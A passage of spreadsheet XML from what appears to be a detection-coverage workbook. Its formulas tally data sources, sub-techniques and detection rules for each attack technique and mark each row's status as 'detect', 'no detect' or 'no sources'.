        <f t="array" ref="G461">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H461" s="9" t="str" cm="1">
        <f t="array" ref="H461">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I461" s="9" t="str" cm="1">
        <f t="array" ref="I461">IF(SUM(IF($C461=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C461=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J461" s="9" t="str" cm="1">
        <f t="array" ref="J46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61" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M461" s="9" cm="1">
        <f t="array" ref="M461">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N461" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O461" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P461" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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61" t="s">
        <v>386</v>
      </c>
      <c r="U461" t="s">
        <v>2235</v>
      </c>
      <c r="V461" t="s">
        <v>2236</v>
      </c>
      <c r="W461" t="b">
        <v>1</v>
      </c>
      <c r="X461" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="462" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A462" t="s">
        <v>2197</v>
      </c>
      <c r="B462" t="s">
        <v>2237</v>
      </c>
      <c r="C462" t="s">
        <v>2238</v>
      </c>
      <c r="D462" t="s">
        <v>6</v>
      </c>
      <c r="E462" t="s">
        <v>2239</v>
      </c>
      <c r="F462" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G462" s="9" cm="1">
        <f t="array" ref="G462">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H462" s="9" t="str" cm="1">
        <f t="array" ref="H462">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I462" s="9" t="str" cm="1">
        <f t="array" ref="I462">IF(SUM(IF($C462=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C462=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J462" s="9" t="str" cm="1">
        <f t="array" ref="J46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62" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M462" s="9" cm="1">
        <f t="array" ref="M462">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N462" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O462" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P462" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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62" t="s">
        <v>368</v>
      </c>
      <c r="U462" t="s">
        <v>2240</v>
      </c>
      <c r="V462" t="s">
        <v>2241</v>
      </c>
      <c r="W462" t="b">
        <v>1</v>
      </c>
      <c r="X462" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="463" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A463" t="s">
        <v>2197</v>
      </c>
      <c r="B463" t="s">
        <v>2242</v>
      </c>
      <c r="C463" t="s">
        <v>2243</v>
      </c>
      <c r="D463" t="s">
        <v>6</v>
      </c>
      <c r="E463" t="s">
        <v>2244</v>
      </c>
      <c r="F463" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G463" s="9" cm="1">
        <f t="array" ref="G463">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H463" s="9" t="str" cm="1">
        <f t="array" ref="H463">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I463" s="9" t="str" cm="1">
        <f t="array" ref="I463">IF(SUM(IF($C463=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C463=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J463" s="9" t="str" cm="1">
        <f t="array" ref="J46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63" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M463" s="9" cm="1">
        <f t="array" ref="M463">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N463" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O463" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P463" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S46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63" t="s">
        <v>368</v>
      </c>
      <c r="U463" t="s">
        <v>2245</v>
      </c>
      <c r="W463" t="b">
        <v>1</v>
      </c>
      <c r="X463" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="464" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A464" t="s">
        <v>2197</v>
      </c>
      <c r="B464" t="s">
        <v>2246</v>
      </c>
      <c r="C464" t="s">
        <v>253</v>
      </c>
      <c r="D464" t="s">
        <v>6</v>
      </c>
      <c r="E464" t="s">
        <v>2247</v>
      </c>
      <c r="F464" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G464" s="9" cm="1">
        <f t="array" ref="G464">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H464" s="9" t="str" cm="1">
        <f t="array" ref="H464">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I464" s="9" t="str" cm="1">
        <f t="array" ref="I464">IF(SUM(IF($C464=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C464=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J464" s="9" t="str" cm="1">
        <f t="array" ref="J46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64" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M464" s="9" cm="1">
        <f t="array" ref="M464">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N464" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O464" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P464" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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64" t="s">
        <v>416</v>
      </c>
      <c r="U464" t="s">
        <v>2248</v>
      </c>
      <c r="W464" t="b">
        <v>1</v>
      </c>
      <c r="X464" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="465" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A465" t="s">
        <v>2249</v>
      </c>
      <c r="B465" t="s">
        <v>2249</v>
      </c>
      <c r="C465" t="s">
        <v>58</v>
      </c>
      <c r="D465" t="s">
        <v>9</v>
      </c>
      <c r="E465" t="s">
        <v>2250</v>
      </c>
      <c r="F465" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G465" s="9" cm="1">
        <f t="array" ref="G465">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H465" s="9" cm="1">
        <f t="array" ref="H465">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I465" s="9" t="str" cm="1">
        <f t="array" ref="I465">IF(SUM(IF($C465=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C465=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J465" s="9" cm="1">
        <f t="array" ref="J46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465" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M465" s="9" cm="1">
        <f t="array" ref="M465">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N465" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O465" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P465" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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65" t="s">
        <v>368</v>
      </c>
      <c r="U465" t="s">
        <v>2251</v>
      </c>
      <c r="V465" t="s">
        <v>2252</v>
      </c>
      <c r="W465" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="466" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A466" t="s">
        <v>2249</v>
      </c>
      <c r="B466" t="s">
        <v>2253</v>
      </c>
      <c r="C466" t="s">
        <v>234</v>
      </c>
      <c r="D466" t="s">
        <v>9</v>
      </c>
      <c r="E466" t="s">
        <v>2250</v>
      </c>
      <c r="F466" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G466" s="9" cm="1">
        <f t="array" ref="G466">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H466" s="9" t="str" cm="1">
        <f t="array" ref="H466">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I466" s="9" t="str" cm="1">
        <f t="array" ref="I466">IF(SUM(IF($C466=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C466=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J466" s="9" t="str" cm="1">
        <f t="array" ref="J46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66" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M466" s="9" cm="1">
        <f t="array" ref="M466">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N466" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O466" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P466" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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66" t="s">
        <v>503</v>
      </c>
      <c r="U466" t="s">
        <v>2254</v>
      </c>
      <c r="V466" t="s">
        <v>2255</v>
      </c>
      <c r="W466" t="b">
        <v>1</v>
      </c>
      <c r="X466" t="s">
        <v>2249</v>
      </c>
    </row>
    <row r="467" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A467" t="s">
        <v>2249</v>
      </c>
      <c r="B467" t="s">
        <v>2256</v>
      </c>
      <c r="C467" t="s">
        <v>232</v>
      </c>
      <c r="D467" t="s">
        <v>9</v>
      </c>
      <c r="E467" t="s">
        <v>2250</v>
      </c>
      <c r="F467" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G467" s="9" cm="1">
        <f t="array" ref="G467">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H467" s="9" t="str" cm="1">
        <f t="array" ref="H467">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I467" s="9" t="str" cm="1">
        <f t="array" ref="I467">IF(SUM(IF($C467=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C467=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J467" s="9" t="str" cm="1">
        <f t="array" ref="J46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67" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M467" s="9" cm="1">
        <f t="array" ref="M467">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N467" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O467" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P467" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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67" t="s">
        <v>386</v>
      </c>
      <c r="U467" t="s">
        <v>2257</v>
      </c>
      <c r="V467" t="s">
        <v>2258</v>
      </c>
      <c r="W467" t="b">
        <v>1</v>
      </c>
      <c r="X467" t="s">
        <v>2249</v>
      </c>
    </row>
    <row r="468" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A468" t="s">
        <v>2259</v>
      </c>
      <c r="B468" t="s">
        <v>2259</v>
      </c>
      <c r="C468" t="s">
        <v>152</v>
      </c>
      <c r="D468" t="s">
        <v>6</v>
      </c>
      <c r="E468" t="s">
        <v>2260</v>
      </c>
      <c r="F468" s="9">
        <f t="shared" si="7"/>
        <v>13</v>
      </c>
      <c r="G468" s="9" cm="1">
        <f t="array" ref="G468">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H468" s="9" cm="1">
        <f t="array" ref="H468">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>12</v>
      </c>
      <c r="I468" s="9" t="str" cm="1">
        <f t="array" ref="I468">IF(SUM(IF($C468=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C468=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J468" s="9" cm="1">
        <f t="array" ref="J46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468" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>12</v>
      </c>
      <c r="M468" s="9" cm="1">
        <f t="array" ref="M468">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>12</v>
      </c>
      <c r="N468" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O468" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P468" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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68" t="s">
        <v>930</v>
      </c>
      <c r="U468" t="s">
        <v>2261</v>
      </c>
      <c r="V468" t="s">
        <v>2262</v>
      </c>
      <c r="W468" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="469" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A469" t="s">
        <v>2259</v>
      </c>
      <c r="B469" t="s">
        <v>2263</v>
      </c>
      <c r="C469" t="s">
        <v>2264</v>
      </c>
      <c r="D469" t="s">
        <v>6</v>
      </c>
      <c r="E469" t="s">
        <v>544</v>
      </c>
      <c r="F469" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G469" s="9" cm="1">
        <f t="array" ref="G469">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H469" s="9" t="str" cm="1">
        <f t="array" ref="H469">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I469" s="9" t="str" cm="1">
        <f t="array" ref="I469">IF(SUM(IF($C469=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C469=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J469" s="9" t="str" cm="1">
        <f t="array" ref="J46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69" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M469" s="9" cm="1">
        <f t="array" ref="M469">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N469" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O469" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P469" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S46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69" t="s">
        <v>368</v>
      </c>
      <c r="U469" t="s">
        <v>2265</v>
      </c>
      <c r="V469" t="s">
        <v>2266</v>
      </c>
      <c r="W469" t="b">
        <v>1</v>
      </c>
      <c r="X469" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="470" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A470" t="s">
        <v>2259</v>
      </c>
      <c r="B470" t="s">
        <v>2267</v>
      </c>
      <c r="C470" t="s">
        <v>248</v>
      </c>
      <c r="D470" t="s">
        <v>6</v>
      </c>
      <c r="E470" t="s">
        <v>2268</v>
      </c>
      <c r="F470" s="9">
        <f t="shared" si="7"/>
        <v>6</v>
      </c>
      <c r="G470" s="9" cm="1">
        <f t="array" ref="G470">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H470" s="9" t="str" cm="1">
        <f t="array" ref="H470">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I470" s="9" t="str" cm="1">
        <f t="array" ref="I470">IF(SUM(IF($C470=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C470=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J470" s="9" t="str" cm="1">
        <f t="array" ref="J47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70" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M470" s="9" cm="1">
